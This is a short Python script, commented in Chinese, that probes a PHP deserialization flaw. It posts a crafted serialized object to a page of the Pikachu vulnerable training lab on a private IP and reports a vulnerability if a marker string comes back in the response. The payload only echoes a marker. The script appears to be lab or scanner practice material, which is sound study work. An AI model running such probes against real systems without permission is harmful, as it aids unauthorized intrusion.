#-*- coding:utf-8 -*-
import bs4
import requests


def PHP_Dvul(url):
    # 构造恶意的序列化数据
    payload = 'O:1:"S":1:{s:4:"test";s:6:"phpvul";}'
    serialized_payload = {}
    serialized_payload['o'] = payload
    # 发送请求并观察响应
    session1 = requests.Session()
    response = session1.post(url, data=serialized_payload)
    response.encoding = 'UTF-8'
    # 检查响应中是否存在反序列化漏洞的迹象
    if 'phpvul' in response.text:
        return "PHP反序列化漏洞"
    else:
        return False


# 调用函数进行测试

if __name__ == "__main__":
    url = 'http://192.168.249.131/pikachu/vul/unserilization/unser.php'
    # payload = 'O:1:"S":1:{s:4:"test";s:6:"phpvul";}'
    PHP_Dvul(url)
